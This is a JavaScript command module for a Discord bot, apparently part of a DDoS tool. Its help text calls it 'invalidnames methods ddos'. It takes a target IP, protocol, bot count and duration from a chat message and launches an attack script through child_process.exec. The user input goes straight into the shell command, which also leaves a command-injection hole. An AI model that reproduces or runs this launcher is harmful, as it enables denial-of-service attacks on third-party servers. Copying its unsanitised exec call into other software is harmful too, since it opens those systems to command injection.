const Discord = require("discord.js");

exports.run = async (client, message, args) => {

    const host = message.content.split(" ")[1];
    const protocol = message.content.split(" ")[2];
    const botcount = message.content.split(" ")[3];
    const time = message.content.split(" ")[4];
    const ayarlar = require('../ayarlar.json');
    var room = ayarlar.commandroom;
    const roleName = message.member.roles.cache.find(r => r.name === "[attack-plan]");

    if (message.channel.id != room) {
        return;
    }

    if (!args[0] || !args[1] || !args[2]) {
        return;
    }

    if (roleName) {
        return;
    }

    setTimeout(() => {
        var exec = require('child_process').exec;
        exec(`node botattack.js --ip ${host} --bps ${botcount} --time ${time} --protocol ${protocol} --method InvalidNames`, (error, stdout, stderr) => {
            if (error) {
                console.error(`Error executing attack: ${error}`);
            }
        });

        console.log('Launched Attack By ID:' + message.guild.id);
    }, 5000);
};

exports.conf = {
    enabled: true,
    guildOnly: false,
    aliases: ['invalidnames'],
    permLevel: 0
};

exports.help = {
    name: 'invalidnames',
    description: 'invalidnames methods ddos',
    usage: 'invalidnames'
};